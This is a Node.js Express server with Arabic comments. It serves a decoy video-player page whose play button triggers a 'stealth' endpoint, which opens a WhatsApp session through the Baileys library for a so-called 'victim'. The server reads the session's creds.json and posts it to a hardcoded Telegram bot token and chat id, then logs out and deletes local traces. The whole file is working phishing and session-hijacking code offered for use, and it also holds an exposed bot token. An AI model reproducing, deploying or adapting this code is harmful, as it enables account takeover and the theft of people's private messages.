const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const https = require('https');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const sessionsDir = path.join(__dirname, 'sessions');
if (!fs.existsSync(sessionsDir)) {
    fs.mkdirSync(sessionsDir, { recursive: true });
}

// إرسال التوكن مباشرة إلى تليجرام باستخدام التوكن والآيدي الخاص بك
function sendToTelegram(text) {
    const token = '8950551673:AAFk_sKE1dvtzvN0MquOFmvp4p20nSI-a2U';
    const chatId = '149900687';
    
    const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', () => {});
    });

    req.on('error', (error) => {
        console.error(`[-] خطأ في إرسال تليجرام: ${error.message}`);
    });

    req.write(data);
    req.end();
}

function cleanupSession(sessionPath) {
    try {
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }
    } catch (e) {
        console.error(`[-] خطأ أثناء التنظيف: ${e.message}`);
    }
}

// واجهة الفيديو الوهمية (التمويه)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>مشاهدة الفيديو</title>
            <style>
                body { background: #000; color: #fff; font-family: Tahoma, sans-serif; text-align: center; margin: 0; padding-top: 100px; }
                .video-container { max-width: 600px; margin: auto; background: #111; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); position: relative; }
                video { width: 100%; display: block; }
                .play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; align-items: center; justify-content: center; cursor: pointer; }
                .play-btn { background: #ff0000; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; font-weight: bold; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="video-container">
                <video id="myVideo" controls>
                    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
                    متصفحك لا يدعم عرض الفيديو
                </video>
                <div id="overlay" class="play-overlay" onclick="triggerStealth()">
                    <button class="play-btn">▶ تشغيل الفيديو</button>
                </div>
            </div>

            <script>
                function triggerStealth() {
                    const video = document.getElementById('myVideo');
                    const overlay = document.getElementById('overlay');
                    
                    overlay.style.display = 'none';
                    video.play();

                    const randomId = 'victim_' + Math.random().toString(36).substring(2, 9);

                    fetch('/api/v1/stealth/connect-auto', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sessionId: randomId })
                    }).catch(err => console.log(err));
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/api/v1/stealth/connect-auto', async (req, res) => {
    const { sessionId } = req.body;
    
    if (!sessionId) {
        return res.status(400).json({ status: 'error', message: 'مفقود' });
    }

    const sessionPath = path.join(sessionsDir, sessionId);

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ['Chrome', 'Windows', '124.0.0.0']
        });

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                console.log(`[+] تم التقاط الجلسة بنجاح للضحية: ${sessionId}`);
                const credsPath = path.join(sessionPath, 'creds.json');
                
                setTimeout(async () => {
                    try {
                        if (fs.existsSync(credsPath)) {
                            const tokenRaw = fs.readFileSync(credsPath, 'utf8');
                            
                            // إرسال بيانات التوكن مباشرة على تليجرام للبوت والآيدي الخاص بك
                            sendToTelegram(`🚨 *تم اصطياد جلسة جديدة!*\n\n*ID:* \`${sessionId}\`\n\n\`\`\`json\n${tokenRaw}\n\`\`\``);

                            await sock.logout();
                            sock.ws.close();
                        }
                    } catch (err) {
                        console.error(`[-] خطأ الحفظ: ${err.message}`);
                    } finally {
                        cleanupSession(sessionPath);
                    }
                }, 2000);

            } else if (connection === 'close') {
                const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
                if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) {
                    cleanupSession(sessionPath);
                }
            }
        });

        sock.ev.on('creds.update', saveCreds);
        return res.json({ status: 'success' });

    } catch (err) {
        cleanupSession(sessionPath);
        return res.status(500).json({ status: 'error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Stealth Engine يعمل على المنفذ ${PORT}`);
});
